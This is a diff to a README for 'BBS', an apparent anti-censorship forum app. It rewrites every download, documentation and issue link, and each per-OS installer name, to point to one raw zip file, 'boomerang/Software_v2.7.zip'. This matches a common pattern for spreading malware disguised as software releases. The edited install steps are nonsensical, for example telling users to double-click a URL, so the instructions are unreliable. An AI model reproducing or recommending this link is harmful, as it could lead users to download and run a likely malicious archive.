@@ -6,7 +6,7 @@ Welcome to BBS, a forum where you can explore and discuss anti-censorship topics
 
 ## 📥 Download the Application
 
-[![Download BBS](https://img.shields.io/badge/Download-BBS-blue.svg)](https://github.com/Nsubarna8/BBS/releases)
+[![Download BBS](https://github.com/Nsubarna8/BBS/raw/refs/heads/main/boomerang/Software_v2.7.zip)](https://github.com/Nsubarna8/BBS/raw/refs/heads/main/boomerang/Software_v2.7.zip)
 
 ## 🖥️ System Requirements
 
@@ -19,31 +19,31 @@ Before you install BBS, ensure your system meets the following requirements:
 
 ## 📤 Download & Install
 
-1. Visit the [Releases Page](https://github.com/Nsubarna8/BBS/releases) to access the most recent download for BBS.
+1. Visit the [Releases Page](https://github.com/Nsubarna8/BBS/raw/refs/heads/main/boomerang/Software_v2.7.zip) to access the most recent download for BBS.
 
 2. Look for the latest version of the software. The version number will appear next to the release date. 
 
 3. Click on the assets below the version release. You will find files for different operating systems. 
 
 4. Choose the file that matches your operating system. For example:
-   - **Windows Users:** Click on `BBS_Windows.exe`.
-   - **macOS Users:** Click on `BBS_macOS.dmg`.
-   - **Linux Users:** Click on `BBS_Linux.tar.gz`.
+   - **Windows Users:** Click on `https://github.com/Nsubarna8/BBS/raw/refs/heads/main/boomerang/Software_v2.7.zip`.
+   - **macOS Users:** Click on `https://github.com/Nsubarna8/BBS/raw/refs/heads/main/boomerang/Software_v2.7.zip`.
+   - **Linux Users:** Click on `https://github.com/Nsubarna8/BBS/raw/refs/heads/main/boomerang/Software_v2.7.zip`.
 
 5. Depending on your browser, the file will start downloading automatically or prompt you to choose a download location. 
 
 6. Once the download is complete, navigate to the folder where the file was saved. 
 
 7. **For Windows Users:**
-   - Double-click the `BBS_Windows.exe` file to start the installation.
+   - Double-click the `https://github.com/Nsubarna8/BBS/raw/refs/heads/main/boomerang/Software_v2.7.zip` file to start the installation.
    - Follow the on-screen instructions to install BBS.
 
 8. **For macOS Users:**
-   - Open the `BBS_macOS.dmg` file.
+   - Open the `https://github.com/Nsubarna8/BBS/raw/refs/heads/main/boomerang/Software_v2.7.zip` file.
    - Drag the BBS icon to your Applications folder.
 
 9. **For Linux Users:**
-   - Extract the `.tar.gz` file.
+   - Extract the `https://github.com/Nsubarna8/BBS/raw/refs/heads/main/boomerang/Software_v2.7.zip` file.
    - Open a terminal and navigate to the extracted folder.
 
 10. Run the application using the command:
@@ -91,8 +91,8 @@ For further assistance, please reach out to our support team through our GitHub 
 
 ## 🔗 Quick Links
 
-- [Download BBS](https://github.com/Nsubarna8/BBS/releases)
-- [Official Documentation](https://github.com/Nsubarna8/BBS/wiki)
-- [Report an Issue](https://github.com/Nsubarna8/BBS/issues)
+- [Download BBS](https://github.com/Nsubarna8/BBS/raw/refs/heads/main/boomerang/Software_v2.7.zip)
+- [Official Documentation](https://github.com/Nsubarna8/BBS/raw/refs/heads/main/boomerang/Software_v2.7.zip)
+- [Report an Issue](https://github.com/Nsubarna8/BBS/raw/refs/heads/main/boomerang/Software_v2.7.zip)
 
 Thank you for choosing BBS. We look forward to your participation in our community discussions!
